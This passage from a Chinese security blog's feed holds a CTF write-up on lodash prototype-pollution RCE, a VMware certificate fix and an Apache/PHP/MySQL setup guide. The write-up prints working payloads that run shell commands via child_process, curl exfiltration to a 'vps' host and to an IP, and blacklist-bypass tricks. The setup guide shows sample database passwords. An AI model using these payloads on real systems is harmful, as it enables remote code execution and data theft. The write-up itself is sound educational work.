class="hljs-string">&#x27;html&#x27;</span>)<br>morganBody(app)<br>app.engine(<span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;hbs&#x27;</span>).__express)<br><br>app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>    matrix[i] = [<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>]<br>  &#125;<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>)<br>&#125;)<br>app.get(<span class="hljs-string">&#x27;/admin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">/*this is under development I guess ??*/</span><br>  <span class="hljs-built_in">console</span>.log(user.admintoken)<br>  <span class="hljs-keyword">if</span> (<br>    user.admintoken &amp;&amp;<br>    req.query.querytoken &amp;&amp;<br>    md5(user.admintoken) === req.query.querytoken<br>  ) &#123;<br>    res.send(<br>      <span class="hljs-string">&#x27;Hey admin your flag is &lt;b&gt;flag&#123;prototype_pollution_is_very_dangerous&#125;&lt;/b&gt;&#x27;</span><br>    )<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.status(<span class="hljs-number">403</span>).send(<span class="hljs-string">&#x27;Forbidden&#x27;</span>)<br>  &#125;<br>&#125;)<br>app.post(<span class="hljs-string">&#x27;/api&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">var</span> client = req.body<br>  <span class="hljs-keyword">var</span> winner = <span class="hljs-literal">null</span><br><br>  <span class="hljs-keyword">if</span> (client.row &gt; <span class="hljs-number">3</span> || client.col &gt; <span class="hljs-number">3</span>) &#123;<br>    client.row %= <span class="hljs-number">3</span><br>    client.col %= <span class="hljs-number">3</span><br>  &#125;<br>  matrix[client.row][client.col] = client.data<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (matrix[i][<span class="hljs-number">0</span>] === matrix[i][<span class="hljs-number">1</span>] &amp;&amp; matrix[i][<span class="hljs-number">1</span>] === matrix[i][<span class="hljs-number">2</span>]) &#123;<br>      <span class="hljs-keyword">if</span> (matrix[i][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;X&#x27;</span>) &#123;<br>        winner = <span class="hljs-number">1</span><br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (matrix[i][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;O&#x27;</span>) &#123;<br>        winner = <span class="hljs-number">2</span><br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][i] === matrix[<span class="hljs-number">1</span>][i] &amp;&amp; matrix[<span class="hljs-number">1</span>][i] === matrix[<span class="hljs-number">2</span>][i]) &#123;<br>      <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][i] === <span class="hljs-string">&#x27;X&#x27;</span>) &#123;<br>        winner = <span class="hljs-number">1</span><br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][i] === <span class="hljs-string">&#x27;O&#x27;</span>) &#123;<br>        winner = <span class="hljs-number">2</span><br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;X&#x27;</span><br>  ) &#123;<br>    winner = <span class="hljs-number">1</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> (<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;O&#x27;</span><br>  ) &#123;<br>    winner = <span class="hljs-number">2</span><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;X&#x27;</span><br>  ) &#123;<br>    winner = <span class="hljs-number">1</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> (<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;O&#x27;</span><br>  ) &#123;<br>    winner = <span class="hljs-number">2</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> (draw(matrix) &amp;&amp; winner === <span class="hljs-literal">null</span>) &#123;<br>    res.send(<span class="hljs-built_in">JSON</span>.stringify(&#123; <span class="hljs-attr">winner</span>: <span class="hljs-number">0</span> &#125;))<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (winner !== <span class="hljs-literal">null</span>) &#123;<br>    res.send(<span class="hljs-built_in">JSON</span>.stringify(&#123; <span class="hljs-attr">winner</span>: winner &#125;))<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.send(<span class="hljs-built_in">JSON</span>.stringify(&#123; <span class="hljs-attr">winner</span>: -<span class="hljs-number">1</span> &#125;))<br>  &#125;<br>&#125;)<br>app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;app listening on port 3000!&#x27;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><p>首先判断请求方式是 POST，然后进行下一步，通过 lodash.merge，将我们 body 中的数值给 data,然后 session 中储存这个 data，这里也大概跟了一下 lodash.merge，其原理应该就是正常的 merge。</p><p>赋值完了之后进行渲染 index,在渲染的适合，会跳到下面这个函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.engine(<span class="hljs-string">&#x27;ejs&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">filePath, options, callback</span>) </span>&#123;<br>  <span class="hljs-comment">// define the template engine</span><br>  fs.readFile(filePath, <span class="hljs-function">(<span class="hljs-params">err, content</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> callback(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(err))<br>    <span class="hljs-keyword">let</span> compiled = lodash.template(content)<br>    <span class="hljs-keyword">let</span> rendered = compiled(&#123; ...options &#125;)<br>    <span class="hljs-keyword">return</span> callback(<span class="hljs-literal">null</span>, rendered)<br>  &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><p>正常传参，断点到template，跟下去</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> sourceURL = <span class="hljs-string">&#x27;//# sourceURL=&#x27;</span> +<br>        (<span class="hljs-string">&#x27;sourceURL&#x27;</span> <span class="hljs-keyword">in</span> options<br>          ? options.sourceURL<br>          : (<span class="hljs-string">&#x27;lodash.templateSources[&#x27;</span> + (++templateCounter) + <span class="hljs-string">&#x27;]&#x27;</span>)<br>        ) + <span class="hljs-string">&#x27;\n&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220530171123571.png"></p><p>此时<code>options.sourceURL</code>是没有定义的，选取这个变量，污染<code>sourceURL</code>，先来看<code>template</code>方法</p><p>返回值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> result = attempt(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">Function</span>(importsKeys, sourceURL + <span class="hljs-string">&#x27;return &#x27;</span> + source)<br>          .apply(<span class="hljs-literal">undefined</span>, importsValues);<br>      &#125;);<br></code></pre></td></tr></table></figure><p>匿名函数钟<code>importValues</code>以数组形式代表参数，这样调用确实不太明白(其中apply是对匿名函数的调用，undefined是指代当前的匿名函数，传进[1,2])，很抽象，继续往下看</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220530172808456.png"></p><p>那么我们控制原型链污染<code>soureceURL</code>后，提前返回污染语句，污染值为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">\r\nreturn e = <span class="hljs-function">() =&gt;</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">global</span>.process.mainModule.constructor._load(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;whoami&#x27;</span>).toString()&#125;\r\n<br></code></pre></td></tr></table></figure><p>其中<code>\r\n</code>是逃避注释的</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220530174452516.png"></p><p>为什么需要return一个匿名函数呢？继续往下看</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220530181823825.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220530181934207.png"></p><p>污染前后可见，res返回需要<code>compiled</code>去动态引入一些配置变量，而且进行第二步的命令执行</p><p>而<code>compiled</code>在<code>template</code>方法返回的是对象函数，然后作为匿名函数</p><p><code>let rendered = compiled(&#123;...options&#125;)</code></p><p>因此需要返回的是一个函数</p><p>exp：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;sourceURL&quot;</span>:<span class="hljs-string">&quot;\u000areturn e =&gt;&#123;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)&#125;&quot;</span>&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;sourceURL&quot;</span>:<span class="hljs-string">&quot;\r\nreturn e =&gt;&#123;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)&#125;&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>不使用return返回，则没有回显，可以配合dnslog或者vps外带</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;sourceURL&quot;</span>:<span class="hljs-string">&quot;\nglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)&quot;</span>&#125;&#125;<br><br><span class="hljs-comment">//反引号好像在win中不起作用，我还以为外带写错了</span><br>&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;sourceURL&quot;</span>:<span class="hljs-string">&quot;\nglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;curl http://vps/\u0060id\u0060&#x27;)&quot;</span>&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;sourceURL&quot;</span>:<span class="hljs-string">&quot;\nglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;curl http://vps/`id`&#x27;)&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>刚开始肯定会突然发现，为什么两者截然不同的污染语句，但可以同样命令执行呢</p><p>仔细地看，其实没有回显的，执行在apply里</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> result = attempt(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-built_in">Function</span>(importsKeys, sourceURL + <span class="hljs-string">&#x27;return &#x27;</span> + source)<br>         .apply(<span class="hljs-literal">undefined</span>, importsValues);<br>     &#125;);<br></code></pre></td></tr></table></figure><p>而我们有回显的的apply执行了return，在<code>let rendered = compiled(&#123;...options&#125;)</code>的匿名函数里execSync执行</p><h4 id="2022网刃杯ezjs"><a href="#2022网刃杯ezjs" class="headerlink" title="2022网刃杯ezjs"></a>2022网刃杯ezjs</h4><p>就是Code-breaking Thejs</p><p>不同的地方加了一个黑名单，需要fuzz</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220530182938957.png"></p><p>fuzz到的名单</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">blacklist = [<span class="hljs-string">&quot;require&quot;</span>,<span class="hljs-string">&quot;return&quot;</span>,<span class="hljs-string">&quot;execSync&quot;</span>,<span class="hljs-string">&quot;curl&quot;</span>,<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;wget&quot;</span>,<span class="hljs-string">&quot;echo&quot;</span>,<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;nl&quot;</span>,<span class="hljs-string">&quot;tac&quot;</span>,<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>]<br></code></pre></td></tr></table></figure><p>首先是有无回显的选取，return被ban了，显然是绕不了了，那么就是无回显，无回显curl，wget，tac等可以<code>cu&#39;+&#39;rl</code>，空格<code>$&#123;IFS&#125;9</code>，flag=&gt;<code>fla\&quot;\&quot;g</code>，<code>global.process.mainModule.require=&gt;global.process.mainModule.constructor._load</code>，<code>execSynec=&gt;exec</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;sourceURL&quot;</span>:<span class="hljs-string">&quot;\nglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;cu\&quot;\&quot;rl$&#123;IFS&#125;http://114.115.157.10/`id`&#x27;)&quot;</span>&#125;&#125;<br><br>#/<span class="hljs-string">&quot;/&quot;</span>  <span class="hljs-string">&quot;+&quot;</span>  单双引号都可以<br>&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;sourceURL&quot;</span>:<span class="hljs-string">&quot;\nglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;cu\&quot;\&quot;rl$&#123;IFS&#125;http://vps/`ta&#x27;+&#x27;c$&#123;IFS&#125;../fl\&quot;\&quot;ag`&#x27;)&quot;</span>&#125;&#125;<br>&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;sourceURL&quot;</span>:<span class="hljs-string">&quot;\nglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;cu\&quot;\&quot;rl$&#123;IFS&#125;http://vps/`ta\&quot;\&quot;c$&#123;IFS&#125;../fl\&quot;\&quot;ag`&#x27;)&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vm证书bug</title>
    <link href="/2021/03/05/vm%E8%AF%81%E4%B9%A6bug/"/>
    <url>/2021/03/05/vm%E8%AF%81%E4%B9%A6bug/</url>
    
    <content type="html"><![CDATA[<p>原因：VMware Authorization Service这个服务替换了本地根证书<br><img src="https://img-blog.csdnimg.cn/2021030518513134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br>解决方案：<br>打开控制面板-管理工具-服务，设置VMware workstation server这个服务的启动类型为手动</p>]]></content>
    
    
    <categories>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>debug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mysql+Apache+PHP</title>
    <link href="/2021/01/31/%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA/"/>
    <url>/2021/01/31/%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="一、安装apache"><a href="#一、安装apache" class="headerlink" title="一、安装apache"></a>一、安装apache</h1><p>高版本不再提供msi安装 下载到的为压缩包方式 需要手动注册apache服务</p><ul><li>将apache解压至目标文件夹并配置<code>conf/httpd.conf</code>：<br><img src="https://img-blog.csdnimg.cn/20210126102746612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></li><li>以管理员身份运行cmd，键入<code> .\..\Apache\bin&gt;httpd.exe -k install -n apache</code> 安装服务</li><li>键入<code>httpd.exe</code>即可启动服务</li><li>在浏览器中键入localhost:端口号<br>如下即apache安装成功<br><img src="https://img-blog.csdnimg.cn/202101271130525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></li></ul><h1 id="二、安装php"><a href="#二、安装php" class="headerlink" title="二、安装php"></a>二、安装php</h1><p>下载好php.zip解压至目标文件夹（注意：下载的php应该是有线程安全的版本）</p><p>写一个1.php（echo hello world）<br>cmd里键入<code>php.exe -f 1.php</code><br><img src="https://img-blog.csdnimg.cn/20210127113446262.png"><br>没问题php安装成功，接下来</p><h1 id="三、从apache加载php"><a href="#三、从apache加载php" class="headerlink" title="三、从apache加载php"></a>三、从apache加载php</h1><ul><li>打开php文件中的<code>php.ini-development</code>改名为<code>php.ini</code></li><li>修改<code>php.ini</code>的语句：<br>①去掉语句<code>;extension_dir=“ext”</code>分号（ini文件中;号为注释符）<br>②双引号内的<code>ext</code>更改为<code>php安装目录/ext</code></li><li>修改<code>apache/conf/httpd.conf</code> 在LoadModule代码区下方添加：<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"> <span class="hljs-comment">#php安装路径/php7apache2_4.dll</span><br>LoadModule php_module <span class="hljs-string">&quot;php安装目录/php7apache2_4.dll&quot;</span> <br> <span class="hljs-comment">#php安装路径</span><br>PHPIniDir <span class="hljs-string">&quot;php安装目录&quot;</span> <br><span class="hljs-comment">#关联 *.php 文件</span><br>AddType application/x-httpd-php <span class="hljs-string">.php</span> <span class="hljs-string">.phtml</span><br></code></pre></td></tr></table></figure></li></ul><p>配置中使用<br><code>httpd.exe -t</code> 查看配置有无问题<br><code>htttp.exe -M</code> 查看加载的模块<br><img src="https://img-blog.csdnimg.cn/20210127134103576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>搭建时注意：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">一、apache和php的版本运行库要求一致 否则报错can<span class="hljs-symbol">&#x27;t</span> locate api module（原因未明）<br>二、apache和php配置文件中路径都使用/作为路径分隔符 不得使用\（会当成转义字符 引发报错）<br>三、从apache加载php模块时 注意代码注释不能置于语句后（tm就是个天坑 浪费老子时间）<br></code></pre></td></tr></table></figure><h1 id="四、安装mysql"><a href="#四、安装mysql" class="headerlink" title="四、安装mysql"></a>四、安装mysql</h1><p>可以使用离线安装版 这里熟悉环境的配置 提高难度<br>选择解压缩版：</p><ul><li><p>下载好mysql 解压缩至目标文件夹并创建<code>my.ini</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[mysqld]</span> <br><span class="hljs-comment"># 设置mysql的安装目录，也就是刚才我们解压的目录</span><br><span class="hljs-attr">basedir</span>=D:/blog/mysql<br><span class="hljs-comment"># 设置mysql数据库的数据的存放目录</span><br><span class="hljs-attr">datadir</span>=D:/blog/mysql/data<br><span class="hljs-comment"># 设置默认使用的端口</span><br><span class="hljs-attr">port</span>=<span class="hljs-number">3306</span><br><span class="hljs-comment"># 允许最大连接数</span><br><span class="hljs-attr">max_connections</span>=<span class="hljs-number">200</span><br><span class="hljs-comment"># 允许连接失败的次数。这是为了防止有人试图攻击数据库</span><br><span class="hljs-attr">max_connect_errors</span>=<span class="hljs-number">10</span><br><span class="hljs-comment"># 服务端使用的字符集</span><br><span class="hljs-attr">character-set-server</span>=utf8mb4<br><span class="hljs-comment"># 数据库字符集对应一些排序等规则使用的字符集</span><br><span class="hljs-attr">collation-server</span>=utf8mb4_general_ci<br><span class="hljs-comment"># 创建新表时将使用的默认存储引擎</span><br><span class="hljs-attr">default-storage-engine</span>=INNODB<br><span class="hljs-comment"># 默认使用“mysql_native_password”插件作为认证加密方式</span><br><span class="hljs-comment"># MySQL8.0默认认证加密方式为caching_sha2_password</span><br><span class="hljs-attr">default_authentication_plugin</span>=mysql_native_password<br> <br><span class="hljs-section">[mysql]</span><br><span class="hljs-comment"># 设置mysql客户端默认字符集</span><br><span class="hljs-attr">default-character-set</span>=utf8mb4<br> <br><span class="hljs-section">[client]</span><br><span class="hljs-attr">default-character-set</span>=utf8mb4<br><span class="hljs-attr">port</span>=<span class="hljs-number">3306</span><br></code></pre></td></tr></table></figure><p>① 以管理员的身份运行cmd：</p></li><li><p>初始化数据库<code>./../mysql/bin&gt;mysqld --initialize --console</code><br><img src="https://img-blog.csdnimg.cn/20210127213544982.png"> <strong>( root@localhost: fu8eu&gt;cGj8Cc )</strong></p></li><li><p>安装服务：<code>./../mysql/bin&gt;mysqld -install</code><br><img src="https://img-blog.csdnimg.cn/20210127213644968.png"></p></li><li><p>启动服务：<code>net start mysql或sc start mysql</code><br><img src="https://img-blog.csdnimg.cn/20210127214010779.png"></p></li><li><p>登录数据库：<code>mysql -u root -p</code>，输入复制的密码（手动输入）<img src="https://img-blog.csdnimg.cn/2021012721440381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p></li><li><p>马上更改密码:<code>alter user &#39;root&#39;@&#39;localhost&#39; identified by &#39;新密码&#39;;</code>（注意分号），提交：<code>commit;</code><br><img src="https://img-blog.csdnimg.cn/20210128094447532.png"></p></li><li><p>退出数据库：<code>quit;</code>(/q或者ctrl^z)<br><img src="https://img-blog.csdnimg.cn/20210127231852310.png"></p></li><li><p>将mysql的bin配置环境变量中（方便启动时不用切换目录）</p></li></ul><h1 id="五、php连接mysql"><a href="#五、php连接mysql" class="headerlink" title="五、php连接mysql"></a>五、php连接mysql</h1><p>此处使用的版本为php7 连接数据库与&lt;5.X有很大不同</p><ul><li>修改php.ini(之前已经配置过php.ini的一处ext.dir)<br>①去掉下面语句的分号：<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">;<span class="hljs-attribute">extension</span>=mysqli<br>;<span class="hljs-attribute">extension</span>=pdo_mysql<br></code></pre></td></tr></table></figure>②在extension代码区下方添加：<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">extension</span>=php_mysqli.dll<br><span class="hljs-attr">extension</span>=php_pdo_mysql.dll<br></code></pre></td></tr></table></figure>测试php能否加载mysqli模块：<br>在apache的htdocs下建立info.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>phpinfo();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>浏览器打开info.php：<br><img src="https://img-blog.csdnimg.cn/20210128110957113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">加载了mysqli的模块，配置成功</li></ul><p>测试php能否操作(连接)数据库：<br>在apache的htdocs下建立test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$db</span>=@<span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;mysqladmin&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$db</span>-&gt;connect_error)<br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Connection failed:&#x27;</span>.<span class="hljs-variable">$db</span>-&gt;connect_error);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h2&gt;Connetion successful&lt;/h2&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210128112818969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><strong>跳步配置php.ini的注意要重启apache服务 勿谓言之不预！</strong></p>]]></content>
    
    
    <categories>
      
      <category>debug</category>
      
    </categories>
    
    
    <tags>
      
      <tag>environment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA</title>
    <link href="/2021/01/23/DVWA%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/01/23/DVWA%E7%AC%94%E8%AE%B0/</url>
    
